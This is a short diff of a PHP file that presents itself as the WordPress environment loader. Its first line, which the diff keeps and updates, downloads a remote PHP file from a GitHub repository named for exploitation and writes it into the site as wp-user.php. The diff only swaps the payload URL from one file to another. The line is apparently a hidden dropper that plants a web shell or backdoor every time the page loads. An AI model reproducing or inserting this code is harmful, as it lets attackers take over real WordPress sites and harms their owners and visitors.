@@ -1,5 +1,5 @@
 <?php 
-file_put_contents("wp-user.php", file_get_contents("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/lolme.php")); 
+file_put_contents("wp-user.php", file_get_contents("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/sec.php")); 
  
 /** 
  * Loads the WordPress environment and template. 
